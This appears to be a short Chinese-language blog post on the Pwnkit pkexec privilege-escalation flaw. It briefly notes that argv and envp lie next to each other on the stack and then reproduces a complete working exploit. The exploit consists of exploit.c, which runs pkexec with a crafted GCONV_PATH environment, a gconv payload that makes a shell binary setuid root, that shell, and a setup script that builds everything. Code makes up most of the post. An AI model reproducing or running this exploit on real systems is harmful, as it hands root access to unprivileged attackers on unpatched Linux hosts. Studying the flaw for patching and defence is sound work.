    昨天我们学习了Pwnkit漏洞的技术细节，是从Poc/Exploit到漏洞原理的解读，总体感觉这个漏洞的利用还是很巧妙的，且难度不大，有点“脑筋急转弯”的感觉。说它难度不大，是因为连我都能看懂；说它玩脑筋急转弯，是因为确实要想到那个点，且要知道argv和envp在栈上是连在一起的这个梗。这样对这个越界的溢出就好理解了。


    我们又学习了那个Poc/Exploit的代码，写得非常贴切，尤其是和理论部分非常地吻合，应该说那个Poc/Exploit就是按照那个理论来编程的。


    昨日，又看了另一个Poc/Exploit。只能说它是在理解了理论部分后是更加简捷的一种利用方法，如下：


一、exploit.c

#include <unistd.h>

#include <stdlib.h>


int main() {

int pid = fork();


if ( pid == 0 ) {

char *argv[] = { NULL };

char *environ[] = {

"value",

"PATH=GCONV_PATH=.",

"CHARSET=FOO",

0

};


execve("/usr/bin/pkexec", argv, environ);

return 0;

}

}

光看这个，其实不好理解，因为它进行了简化和省略，但原理是一样的。可以看作这个是上一篇的深入理解。


二、其它附加部分：

//shell.c

#include <stdlib.h>

#include <unistd.h>


int main(int argc, char **argv, char **envp) {

gid_t gid = getegid();

uid_t uid = geteuid();


setregid(gid, gid);

setreuid(uid, uid);


system("/bin/bash");

}

//payload.c

#include <stdio.h>

#include <stdlib.h>

#include <sys/types.h>

#include <unistd.h>


void gconv() {}


void gconv_init() {

gid_t gid = getegid();

uid_t uid = geteuid();


setregid(gid, gid);

setreuid(uid, uid);


system("/usr/bin/chown root shell");

system("/usr/bin/chmod 4777 shell");

}

//setup.sh

#!/usr/bin/env bash


mkdir -p "GCONV_PATH=."

touch "GCONV_PATH=./value"

chmod u+x "GCONV_PATH=./value"


mkdir -p value

cp ./gconv-modules value

gcc -shared -fPIC -o value/payload.so payload.c

gcc -o exploit exploit.c

gcc -o shell shell.c
